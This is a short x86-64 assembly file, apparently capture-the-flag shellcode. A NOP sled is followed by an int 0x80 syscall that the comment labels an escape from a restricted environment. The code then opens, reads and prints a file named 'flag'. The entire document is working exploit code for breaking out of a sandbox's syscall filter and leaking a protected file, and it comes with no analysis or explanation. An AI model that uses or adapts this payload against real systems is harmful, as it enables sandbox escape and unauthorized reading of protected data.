BITS 64

; some padding since we don't start right on top
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

; escape via fork
mov al, 2
xor esi, esi
mov rdi, r13
int 0x80

; we are out!
call start
start:
pop r8

; open("flag", 0, O_RDONLY)
mov rax, 2
mov rdi, r8
add rdi, flag-start
xor rsi, rsi
xor rdx, rdx
syscall

; read(3, data, 100)
mov rax, 0
mov rdi, 3
mov rsi, r8
add rsi, data-start
mov rdx, 100
syscall

; write(1, data, 100)
mov rax, 1
mov rdi, 1
mov rsi, r8
add rsi, data-start
mov rdx, 100
syscall

halt:
jmp $


flag: db "flag", 0
data:
